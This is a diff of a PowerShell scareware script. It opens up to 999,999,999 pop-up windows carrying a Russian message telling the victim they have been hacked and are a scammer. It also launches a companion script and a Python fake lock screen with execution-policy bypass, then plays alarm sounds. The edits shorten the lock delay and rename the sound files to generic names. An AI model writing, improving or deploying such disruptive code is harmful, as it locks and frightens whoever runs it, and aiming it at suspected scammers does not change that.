@@ -1,4 +1,4 @@
-param(
+﻿param(
     [ValidateRange(1, 999999999)]
     [int]$WindowCount = 999999999,
     [string]$WindowMessage = "Тебя взломали, уже поздно, ты — скамер.",
@@ -11,17 +11,12 @@ $lautScriptPath = Join-Path $PSScriptRoot "laut.ps1"
 if (-not (Test-Path -LiteralPath $lautScriptPath)) {
     throw "Datei nicht gefunden: $lautScriptPath"
 }
+& $lautScriptPath
+
 $currentExecutable = (Get-Process -Id $PID).Path
 if ([string]::IsNullOrWhiteSpace($currentExecutable)) {
     $currentExecutable = Join-Path $PSHOME "pwsh.exe"
 }
-Start-Process -FilePath $currentExecutable -ArgumentList @(
-    "-NoProfile",
-    "-ExecutionPolicy",
-    "Bypass",
-    "-File",
-    ('"{0}"' -f $lautScriptPath)
-) | Out-Null
 
 $lockScreenScriptPath = Join-Path $PSScriptRoot "Russk.py"
 $pythonCommand = Get-Command python -ErrorAction SilentlyContinue
@@ -30,7 +25,7 @@ if (-not $pythonCommand) {
 }
 if ($pythonCommand -and (Test-Path -LiteralPath $lockScreenScriptPath)) {
     $lockCommand = @"
-Start-Sleep -Seconds 30
+Start-Sleep -Seconds 20
 if (Test-Path -LiteralPath '$lockScreenScriptPath') {
     & '$($pythonCommand.Source)' '$lockScreenScriptPath'
 }
@@ -43,7 +38,7 @@ if (Test-Path -LiteralPath '$lockScreenScriptPath') {
         $lockCommand
     ) | Out-Null
 
-    $shutdownCommand = "Start-Sleep -Seconds 30; Stop-Process -Id $PID -Force"
+    $shutdownCommand = "Start-Sleep -Seconds 20; Stop-Process -Id $PID -Force"
     Start-Process -FilePath $currentExecutable -ArgumentList @(
         "-NoProfile",
         "-ExecutionPolicy",
@@ -54,9 +49,9 @@ if (Test-Path -LiteralPath '$lockScreenScriptPath') {
 }
 
 $files = @(
-    (Join-Path $PSScriptRoot "TTSOL-ru-RU-Dmitry-20260911-211138.mp3"),
-    (Join-Path $PSScriptRoot "matthewvakaliuk73627-mayotte-eas-alarm-298725.mp3"),
-    (Join-Path $PSScriptRoot "freesound_community-red-alert_nuclear_buzzer-99741.mp3")
+    (Join-Path $PSScriptRoot "s1.mp3"),
+    (Join-Path $PSScriptRoot "s2.mp3"),
+    (Join-Path $PSScriptRoot "s3.mp3")
 )
 
 foreach ($file in $files) {
